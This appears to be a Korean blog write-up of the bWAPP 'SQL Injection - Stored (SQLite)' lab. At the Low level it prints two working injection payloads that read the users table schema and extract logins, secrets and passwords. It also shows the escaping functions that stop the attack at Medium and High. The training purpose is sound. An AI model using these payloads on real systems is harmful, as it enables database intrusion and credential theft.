---
layout: single
title: (bWAPP)SQL Injection - Stored (SQLite)
categories: bwapp
tag: [sql injection, sql, injection, bwapp, bee box, GET, OWASP TOP 10, OWASP]
toc: true
author_profile: false
---

# 검증 로직
> Low Level 에서는 보안 대책이 적용되어 있지 않다.

## Level - Low

![그림 1-1](/assets/image/bwapp/injection/stored-sqlite-archive/image1.png)
- 이전과 동일하지만 DBMS의 종류가 SQLite이다.
- 공격 방식은 동일하지만 문법을 SQLite로 하면 된다.

![그림 1-2](/assets/image/bwapp/injection/stored-sqlite-archive/image2.png)
- users 라는 테이블 확인

```sql
test',(select tbl_sql from sqlite_master where tbl_name='users'))--
```

![그림 1-3](/assets/image/bwapp/injection/stored-sqlite-archive/image3.png)
- 각각의 컬럼명도 확인했다.

```sql
test',(select login||id||secret||password from users limit 1,1))--
```

![그림 1-4](/assets/image/bwapp/injection/stored-sqlite-archive/image4.png)

- 테이터 성공적으로 추출했다.

## Medium & High

```php
function sqli_check_1($data)
{
    return addslashes($data)
}

function sqli_check_2($data)
{
    return mysql_real_escape_string($data);
}
```

1. Medium Level 에서는 addslahes() 함수를 사용하여 ‘(싱글쿼터 )를 입력하게되면 \ 를 앞에 붙여 ‘(싱글쿼터) 사용을 막고 있다. 해당 search 구문인 ‘%%’ 로 이루어져 있어 공격이 성립되지 않는다.
2. High Level 에서는 mysql_real_escape_string() 함수를 사용하여 메타문자를 방지하고 있다.
3. 해당 문제에서 Medium 과 High Level은 공격이 성립되지 않는다.

